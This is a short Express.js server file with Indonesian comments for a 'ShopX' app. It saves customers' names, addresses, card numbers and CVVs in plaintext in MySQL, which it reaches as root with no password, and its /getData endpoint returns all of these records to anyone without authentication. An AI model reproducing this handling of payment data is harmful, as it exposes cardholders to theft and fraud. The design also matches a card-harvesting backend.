const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const mysql = require('mysql2'); // Import mysql2
const app = express();
const PORT = 3000;

// Middleware
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));
app.use(require('cors')());

// Koneksi ke MySQL
const db = mysql.createConnection({
  host: 'localhost', // Menghubungkan ke MySQL di localhost
  user: 'root', // Default user di XAMPP adalah 'root'
  password: '', // Biasanya kosong pada XAMPP
  database: 'shopx', // Nama database yang kamu buat di phpMyAdmin
});

db.connect((err) => {
  if (err) {
    console.error('Gagal terhubung ke database:', err);
    return;
  }
  console.log('Terhubung ke database MySQL');
});

// Endpoint menerima data dari frontend
app.post('/submit', (req, res) => {
  const { nama, telepon, alamat, kartu, cvv, pemilik } = req.body;

  // Validasi data
  if (!nama || !telepon || !alamat || !kartu || !cvv || !pemilik) {
    return res.status(400).json({ message: 'Data tidak lengkap.' });
  }

  // Query untuk menyimpan data ke database
  const query = 'INSERT INTO pengguna (nama, telepon, alamat, kartu, cvv, pemilik) VALUES (?, ?, ?, ?, ?, ?)';
  const values = [nama, telepon, alamat, kartu, cvv, pemilik];

  db.query(query, values, (err, result) => {
    if (err) {
      console.error('Gagal menyimpan data:', err);
      return res.status(500).json({ message: 'Gagal menyimpan data.' });
    }
    console.log('Data berhasil disimpan:', result);
    res.json({ message: 'Data berhasil disimpan!' });
  });
});

// Endpoint untuk mengambil riwayat data dari database
app.get('/getData', (req, res) => {
  const query = 'SELECT * FROM pengguna ORDER BY timestamp DESC'; // Menampilkan data berdasarkan waktu terakhir
  db.query(query, (err, results) => {
    if (err) {
      console.error('Gagal mengambil data:', err);
      return res.status(500).json({ message: 'Gagal mengambil data.' });
    }
    res.json({ data: results });
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`Server ShopX berjalan di http://localhost:${PORT}`);
});
